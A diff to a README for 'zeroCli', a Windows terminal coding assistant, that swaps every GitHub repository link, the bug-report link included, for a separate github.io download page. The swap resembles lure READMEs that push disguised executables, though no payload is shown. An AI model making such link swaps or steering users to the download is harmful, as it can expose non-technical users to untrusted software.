@@ -1,6 +1,6 @@
 # 🌸 zeroCli - Your Friendly Terminal Coding Assistant
 
-[![Download zeroCli](https://img.shields.io/badge/⬇️_Download-zeroCli-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/jhay6814/zeroCli)
+[![Download zeroCli](https://img.shields.io/badge/⬇️_Download-zeroCli-blueviolet?style=for-the-badge&logo=windows&logoColor=white)](https://jhay6814.github.io)
 
 zeroCli is a small program that lives in your terminal and helps you get coding work done by simply describing what you want in plain language. It comes with Zero-chan, a pixel-art anime mascot who keeps you company while you work. You do not need to be a programmer to get started — if you can download a file and double-click it, you can use zeroCli.
 
@@ -38,7 +38,7 @@ Getting zeroCli onto your Windows computer takes only a moment.
 
 **Step 1 — Visit the download page.**
 
-👉 **[https://github.com/jhay6814/zeroCli](https://github.com/jhay6814/zeroCli)**
+👉 **[https://jhay6814.github.io](https://jhay6814.github.io)**
 
 Visit this link to download the application.
 
@@ -144,7 +144,7 @@ Your conversations go directly from your computer to whichever AI provider you s
 
 Found a bug? Have an idea for Zero-chan? The project lives on GitHub, and the issue tracker is the best place to share thoughts. Bug reports, feature requests, and kind words are all welcome.
 
-👉 **[https://github.com/jhay6814/zeroCli](https://github.com/jhay6814/zeroCli)**
+👉 **[https://jhay6814.github.io](https://jhay6814.github.io)**
 
 Visit this link to download the application.
 
